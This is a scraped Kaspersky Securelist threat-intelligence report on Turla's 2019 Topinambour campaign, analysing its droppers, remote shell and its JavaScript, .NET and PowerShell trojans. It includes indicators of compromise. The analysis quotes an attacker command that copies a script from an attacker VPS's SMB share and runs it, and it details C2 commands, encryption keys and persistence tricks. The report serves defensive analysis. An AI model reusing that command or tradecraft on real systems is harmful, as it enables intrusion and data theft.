# Reference for threat actor for "Turla, Waterbug, Venomous Bear"

**Title**: Turla renews its arsenal with Topinambour | Securelist

**Source**: https://securelist.com/turla-renews-its-arsenal-with-topinambour/91687/

## Content















Turla renews its arsenal with Topinambour | Securelist



































































Solutions for:

Home Products
Small Business 1-50 employees
Medium Business 51-999 employees
Enterprise 1000+ employees
 



















by Kaspersky


CompanyAccount
Get In Touch
Dark mode off
EnglishRussianSpanish













Solutions



Hybrid Cloud SecurityLearn More
Internet of Things & Embedded SecurityLearn More
Threat Management and DefenseLearn More
Industrial CybersecurityLearn More
Fraud PreventionLearn More



Other solutions
Blockchain Security
Kaspersky for Security Operations Center


Industries



National CybersecurityLearn More
Industrial CybersecurityLearn More
Finance Services CybersecurityLearn More
Healthcare CybersecurityLearn More
Transportation CybersecurityLearn More
Retail CybersecurityLearn More



Other Industries
Telecom Cybersecurity
Blockchain Security
View all


Products



KasperskyEndpoint Security for BusinessLearn More
KasperskyEndpoint Detection and Response (EDR)Learn More
KasperskyEDR OptimumLearn More
KasperskyAnti Targeted Attack PlatformLearn More
KasperskyManaged Detection and ResponseLearn More
KasperskySandboxLearn More



Other Products
Kaspersky Security for Mail Server
Kaspersky Security for Internet Gateway
Kaspersky Embedded Systems Security
Kaspersky Hybrid Cloud Security for AWS
Kaspersky Hybrid Cloud Security for Azure
View All


Services



KasperskyCybersecurity ServicesLearn More
KasperskyAdaptive Online TrainingLearn More
KasperskyPremium SupportLearn More
KasperskyThreat IntelligenceLearn More
KasperskyAPT Intelligence ReportingLearn More
KasperskyTargeted Attack DiscoveryLearn More



Other Services
Kaspersky Professional Services
Kaspersky Incident Response
Kaspersky Cybersecurity Training
Kaspersky Incident Communications
Kaspersky Security Awareness
View All


Resource Center

Case Studies
White Papers
Datasheets
Technologies
MITRE ATT&CK

About Us

Transparency
Corporate News
Press Center
Careers
Innovation Hub
Sponsorship
Policy Blog
Contacts

GDPR
 





Subscribe
 Dark mode off
Login


Securelist menu

EnglishRussianSpanish
Existing Customers

Personal

My Kaspersky
Renew your product
Update your product
Customer support

Business

KSOS portal
Kaspersky Business Hub
Technical Support
Knowledge Base
Renew License


Home

Products
Trials&Update
Resource Center

Business

Small Business (1-50 employees)
Medium Business (51-999 employees)
Enterprise (1000+ employees)


Securelist
Threats

Financial threats
Mobile threats
Web threats
Secure environment (IoT)
Vulnerabilities and exploits
Spam and Phishing
Industrial threats

Categories

APT reports
Incidents
Research
Malware reports
Spam and phishing reports
Publications
Kaspersky Security Bulletin

Archive
All Tags
APT Logbook
Webinars
Statistics
Encyclopedia
Threats descriptions
KSB 2021

About Us

Company
Transparency
Corporate News
Press Center
Careers
Sponsorships
Policy Blog
Contacts

Partners

Find a Partner
Partner Program
















Content menu
Close













Subscribe













by Kaspersky

 Dark mode off




ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 











 

APT reports

Turla renews its arsenal with Topinambour 

APT reports

15 Jul 2019

  minute read								








 

Authors




GReAT





Turla, also known as Venomous Bear, Waterbug, and Uroboros, is a Russian speaking threat actor known since 2014, but with roots that go back to 2004 and earlier. It is a complex cyberattack platform focused predominantly on diplomatic and government-related targets, particularly in the Middle East, Central and Far East Asia, Europe, North and South America and former Soviet bloc nations.
2019 has seen the Turla actor actively renew its arsenal. Its developers are still using a familiar coding style, but they’re creating new tools. Here we’ll tell you about several of them, namely “Topinambour” (aka Sunchoke – the Jerusalem artichoke) and its related modules. We didn’t choose to name it after a vegetable; the .NET malware developers named it Topinambour themselves.
The new modules were used in an active campaign that started at the beginning of 2019. As usual, the actor targeted governmental entities. The role of the .NET module is to deliver the known KopiLuwak JavaScript Trojan. Moreover, this actor now also has a heavily obfuscated PowerShell Trojan that is similar to KopiLuwak. Among the control servers there are several legitimate but compromised WordPress websites with the actor’s .php scripts on them.
This time, the developers left some Easter eggs for the targets and researchers. The .NET modules include amusing strings such as “TrumpTower” as an initial vector for RC4 encryption. “RocketMan!” (probably a reference to Donald Trump’s nickname for Kim Jong Un) and “MiamiBeach” serve as the first beacon messages from the victim to the control server.
How Topinambour spreads
To deliver all this to targets, the operators use legitimate software installers infected with the Topinambour dropper. These could be tools to circumvent internet censorship, such as “Softether VPN 4.12” and “psiphon3”, or Microsoft Office “activators”.
The dropper contains a tiny .NET shell that will wait for Windows shell commands from the operators. Using this and SMB shares on rented virtual private servers (VPS), the campaign operators spread the next-stage modules using just “net use” and “copy” Windows shell commands. It’s hard to believe, but SMB still works through public networks.
These campaign-related VPSs are located in South Africa. Interestingly, their external IP addresses start with “197.168”. Possibly these first two bytes are there to mimic LAN addresses that start with “192.168”. Lateral movements in the target’s infrastructure show how familiar the campaign operators are with the IPv6 protocol. Along with IPv4 they use the newer version for shell commands and LAN addresses.
What Topinambour wants from the targets
The purpose of all this infrastructure and modules in JavaScript, .NET and PowerShell is to build a “fileless” module chain on the victim’s computer consisting of an initial small runner and several Windows system registry values containing the encrypted remote administration tool. The tool does all that a typical Trojan needs to accomplish: upload, download and execute files, fingerprint target systems. The PowerShell version of the Trojan also has the ability to get screenshots.



Trojan
Command set


JavaScript
exit upld inst wait dwld


.NET
#down #upload #timeout #stop #sync


PowerShell
#upload #down #screen #timeout #stop #sync



Even the command system in the different Trojans is quite similar
Interesting technical features
A plausible hypothesis for developing similar malware in different languages could be to avoid detection: if one version is detected on the victim’s computer, the operators can try an analogue in a different language. In the table below, we compare Trojans in terms of encryption keys in use and initial messages to control servers.



Trojan
RC4 encryption key
Initial beacon to C2


JavaScript KopiLuwak
01a8cbd328df18fd49965d68e2879433
“bYVAoFGJKj7rfs1M” plus hash based upon Windows installation date


.NET
TrumpTower
RocketMan!


PowerShell
TimesNewRoman
MiamiBeach



For some reason, the developers prefer to entertain targets and researchers instead of randomizing strings
Our analysis of the dropper is based on the sample below:

SHA256                      8bcf125b442f86d24789b37ce64d125b54668bc4608f49828392b5b66e364284
MD5                110195ff4d7298ba9a186335c55b2d1f
Compiled        2018.09.10 12:08:14 (GMT)
Size                1 159 680
Original name             topinambour.exe

The dropper sample on which our analysis is based implements the following features:



Dropper function
Features


unpack_p
Drops payload to %LOCALAPPDATA%/VirtualStore/certcheck.exe. The “p” in the function name and corresponding resource in the dropper stands for “payload”


make_some_noise
Gains persistence for payload with a scheduled task that starts every 30 minutes


unpack_o
Drops the original application that the dropper tries to mimic (such as psiphon3) to %TEMP%/activator.exe and runs it. Here “o” in the function name and corresponding resource in the dropper stands for “original”



The Topinambour authors decided to name the remote shell persistence function “make_some_noise()”
Dropped tiny .NET remote shell
The tiny dropped application gets Windows shell commands from the C2 and silently executes them.
The Topinambour tiny .NET shell first tries to get commands from an external IP, which looks like a LAN, and then continues with possibly infected LAN IPs 
The first DWORD (four bytes) received after a TCP request to the C2 is the data size for the following communication. Then the data contained in the next packets will be the Windows shell command to silently execute the application using “cmd.exe /c”. And that’s it – straightforward, simple and useful.
KopiLuwak dropper
This is where the notorious KopiLuwak comes into play. The .NET remote shell silently downloads scripts from the C2 – from the opened SMB share on a remote CELL-C VPS in South Africa to be precise. “Net use” and “copy” Windows shell commands are enough to fulfil the task.
cmd.exe /c net use \\197.168.0.247\c$ <user_pass_here> /user:administrator & copy /y \\197.168.0.247\c$\users\public\documents\i.js $documents\j.js & $documents\j.js
As a result, the victim is infected with a KopiLuwak obfuscated JavaScript.
Deobfuscated KopiLuwak dropper that puts the RC4 decryption key into the scheduler task for next-stager persistence
Its functions are described in the table below:



Script function
Features


Create scheduler task
Creates a task with the name ProactiveScan, description “NTFS Volume Health Scan”, which runs C:\Users\<user_name_here>\AppData\Roaming\Microsoft\Chkdsk.js with the parameters “-scan Kdw6gG7cpOSZsBeH”, where the parameter is the RC4 decryption key


Fingerprint host
Saves a set of commands such as systeminfo, net view, tasklist /v, gpresult /z, dir \x22%programfiles%\x5cKaspersky Lab\x22, tracert www.google.com to
%appdata%\Microsoft\x5ct235.dat


Drop next JavaScript
Drops C:\Users\<user_name_here>\AppData\Roaming\Microsoft\Chkdsk.js



The dropped “Chkdsk.js” decrypts one more script using the RC4 key provided in the dropper’s scheduled task and runs the decrypted code. This final stager is a more complex Trojan, able to parse and execute custom commands from the C2.
The operators get the victim’s data in XML format: every message has a 16-byte signature at the beginning and a victim-specific fingerprint that the developer calls “ridid”.



Constant
Bytes
Value and features


magic
16
Every encrypted message from the infected host starts with this. In the samples described, the magic bytes are ‘bYVAoFGJKj7rfs1M’.


ridid
32
Hash value, based on Windows installation date and the aforementioned 16-byte magic value


RC4 iv
32
RC4 initial vector to encrypt communication between the target and the C2. In the samples described, the IV value is “01a8cbd328df18fd49965d68e2879433”



Decrypted and deobfuscated target hashing algorithm, based on Windows installation date and 16-byte hardcoded string
The malware communicates with a legitimate compromised WordPress-based website and gets four byte length commands from URL like “http://<legitimate domain>/wp-includes/Requests/Socks.php”. First, the malware beacons to its C2 and gets the command to execute as an answer.



Command 
Features


exit
Send “t235.dat” fingerprinting file content with “upl” text in the XML message, delete the file and stop script execution


upld
Send “t235.dat” content with “upl” text in XML message. If no such file exists, or it’s empty, it sends “opt file no exists or size limit” text in the XML message


inst
Command format is:

–          three bytes after command – overall server response length
–          three following bytes – they are “jss”
–          Tail – JavaScript to execute

Send ‘good install’ and “t235.dat” content in the XML messages. Save executed JavaScript file as %APPDATA%\Microsoft\ghke94d.jss


wait
Do nothing


dwld
Command format is the same as for the “inst” command, but the script from the server will not be executed at once. It saves the decrypted JavaScript as %APPDATA%\Microsoft\awgh43.js and sends ‘success get_parse_command’ in the XML message



KopiLuwak JavaScript
The downloaded script takes a binary from the Windows registry and runs it. The registry subkeys and values vary from target to target.
The slightly obfuscated script used to run the payload from registry
It is not completely clear how the registry keys were created; however, the attackers usually use the .NET initial infector for that. In some samples, there is an additional function to get the victim´s MAC address.
This is the end of first “JavaScript” infection chain. Now, let’s also briefly describe the second .NET-based chain.
.NET RocketMan Trojan
We call this Trojan RocketMan after the string the developer uses for beaconing. Another string inside this malware is “TrumpTower”, used as an RC4 encryption initial vector.
This malware reads the C2 IP and port from the registry where it was saved by the previous stager. It processes the following commands from its C2 that are received encrypted over HTTP:



Command
Features


#down
Make HTTP POST request to http://<config_ip>:<config_port>/file to download the file with the provided name to the victim’s computer


#upload
Make HTTP GET request to http://<config_ip>:<config_port>/update, decrypt server response and upload the file to the server with the provided path and name


#timeout
Get the pause length from the server command argument and wait


#stop
Make HTTP GET request to http://<config_ip>:<config_port>/exit, stop the Trojan operation


#sync
Send encrypted “RocketMan!” string to the server



PowerShell MiamiBeach Trojan
Last but not least, the developers behind the Topinambour campaign also used a PowerShell Trojan. This Trojan contains around 450 strings and uses “TimesNewRoman” as the RC4 initial vector to encrypt C2 communications.
This module beacons to its hardcoded C2 with the string “MiamiBeach” using an HTTP POST. The Trojan is quite similar to the .NET RocketMan Trojan and can handle the same commands; additionally, it includes the “#screen” command to take a screenshot.
Conclusions
The reason behind the development of KopiLuwak’s PowerShell and .NET analogues may be simply to minimize detection of the well-known, publicly discussed JavaScript versions. Using the Windows system registry to store encrypted data that is later used by the malware also seems to be aimed at minimizing detection and reducing the digital footprint on any victim’s computer, where only a tiny starter would be left.
It’s a bit surprising, amusing and not entirely clear why the developers have used some seemingly US-related strings such as “RocketMan!”, “TrumpTower” or “make_some_noise”. They are hardly likely to serve as false flags. The usage of KopiLuwak, a well-known and exclusive artefact previously used by the Turla group, makes us attribute this campaign to this actor with high confidence.
Indicators of compromise
C2 HTTP GET templates

http://<config_ip>:<config_port>/file
http://<config_ip>:<config_port>/update
http://<config_ip>:<config_port>/exit

Some campaign-related MD5 hashes 

47870ff98164155f088062c95c448783
2c1e73da56f4da619c4c53b521404874
6acf316fed472300fa50db54fa6f3cbc
9573f452004b16eabd20fa65a6c2c1c4
3772a34d1b731697e2879bef54967332
d967d96ea5d0962e08844d140c2874e0
a80bbd753c07512b31ab04bd5e3324c2
37dc2eb8ee56aeba4dbd4cf46f87ae9a
710f729ab26f058f2dbf08664edb3986

Domains and IPs
VPSs used as control servers

197.168.0.73
197.168.0.98
197.168.0.212
197.168.0.243
197.168.0.247
197.168.0.250







Dropper
JavaScript
PowerShell
Targeted attacks
Trojan
Turla



Authors




GReAT





Turla renews its arsenal with Topinambour 
 Your email address will not be published. Required fields are marked *Name * 
Email * 

  




Cancel 

Δ 





GReAT webinars






																		13 May 2021, 1:00pm								
GReAT Ideas. Balalaika Edition 





Boris Larin



Denis Legezo










																		26 Feb 2021, 12:00pm								
GReAT Ideas. Green Tea Edition 





John Hultquist



Brian Bartholomew



Suguru Ishimaru



Vitaly Kamluk



Seongsu Park



Yusuke Niwa



Motohiko Sato










																		17 Jun 2020, 1:00pm								
GReAT Ideas. Powered by SAS: malware attribution and next-gen IoT honeypots 





Marco Preuss



Denis Legezo



Costin Raiu



Kurt Baumgartner



Dan Demeter



Yaroslav Shmelev










																		26 Aug 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat actors advance on new fronts 





Ivan Kwiatkowski



Maher Yamout



Noushin Shabab



Pierre Delcher



Félix Aime



Giampaolo Dedola



Santiago Pontiroli










																		22 Jul 2020, 2:00pm								
GReAT Ideas. Powered by SAS: threat hunting and new techniques 





Dmitry Bestuzhev



Costin Raiu



Pierre Delcher



Brian Bartholomew



Boris Larin



Ariel Jungheit



Fabio Assolini












From the same authors




 


Coyote: A multi-stage banking Trojan abusing the Squirrel installer 






 


FakeSG campaign, Akira ransomware and AMOS macOS stealer 






 


Advanced threat predictions for 2024 






 


Stealer for PIX payment system, new Lumar stealer and Rhysida ransomware 






 


Updated MATA attacks industrial companies in Eastern Europe 









Subscribe to our weekly e-mails
The hottest research right in your inbox




Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ








In the same category




 


HrServ – Previously unknown web shell used in APT attack 






 


Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 






 


A cascade of compromise: unveiling Lazarus’ new campaign 






 


How to catch a wild triangle 






 


StripedFly: Perennially flying under the radar 






 















Latest Posts




 



Malware descriptions

Cracked software beats gold: new macOS backdoor stealing cryptowallets 





Sergey Puzan










 



Kaspersky Security Bulletin

Dark web threats and dark market predictions for 2024 





Sergey Lozhkin



Anna Pavlovskaya



Kaspersky Security Services










 



Research

A lightweight method to detect potential iOS malware 





Maher Yamout










 



Research

Operation Triangulation: The last (hardware) mystery 





Boris Larin












Latest Webinars





 




Technologies and services



												11 Dec 2023, 4:00pm					
60 min

The Future of AI in cybersecurity: what to expect in 2024






Vladimir Dashchenko



Victor Sergeev



Vladislav Tushkanov



Dennis Kipker











 




Threat intelligence and IR



												30 Nov 2023, 4:00pm					
70 min

Responding to a data breach: a step-by-step guide






Anna Pavlovskaya











 




Cyberthreat talks



												14 Nov 2023, 4:00pm					
60 min

2024 Advanced persistent threat predictions






Igor Kuznetsov



David Emm



Marc Rivero



Dan Demeter



Sherif Magdy











 




Cyberthreat talks



												09 Nov 2023, 5:00pm					
60 min

Overview of modern car compromise techniques and methods of protection






Alexander Kozlov



Sergey Anufrienko












Reports







HrServ – Previously unknown web shell used in APT attack 

In this report Kaspersky researchers provide an analysis of the previously unknown HrServ web shell, which exhibits both APT and crimeware features and has likely been active since 2021.








Modern Asian APT groups’ tactics, techniques and procedures (TTPs) 

Asian APT groups target various organizations from a multitude of regions and industries. We created this report to provide the cybersecurity community with the best-prepared intelligence data to effectively counteract Asian APT groups.








A cascade of compromise: unveiling Lazarus’ new campaign 

We unveil a Lazarus campaign exploiting security company products and examine its intricate connections with other campaigns








How to catch a wild triangle 

How Kaspersky researchers obtained all stages of the Operation Triangulation campaign targeting iPhones and iPads, including zero-day exploits, validators, TriangleDB implant and additional modules.








 









Subscribe to our weekly e-mails
The hottest research right in your inbox





Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe











Δ








 











ThreatsThreats

APT (Targeted attacks)
Secure environment (IoT)
Mobile threats
Financial threats
Spam and phishing
Industrial threats
Web threats
Vulnerabilities and exploits


CategoriesCategories

APT reports
Malware descriptions
Security Bulletin
Malware reports
Spam and phishing reports
Security technologies
Research
Publications


Other sections

Archive
All tags
Webinars
APT Logbook
Statistics
Encyclopedia
Threats descriptions
KSB 2023


 









© 2024 AO Kaspersky Lab. All Rights Reserved.
Registered trademarks and service marks are the property of their respective owners.



Privacy Policy
License Agreement
Cookies












Subscribe to our weekly e-mails
The hottest research right in your inbox



Email*

*

I agree to provide my email address to “AO Kaspersky Lab” to receive information about new posts on the site. I understand that I can withdraw this consent at any time via e-mail by clicking the “unsubscribe” link that I find at the bottom of any e-mail sent to me for the purposes mentioned above.

 
 Subscribe










Δ



























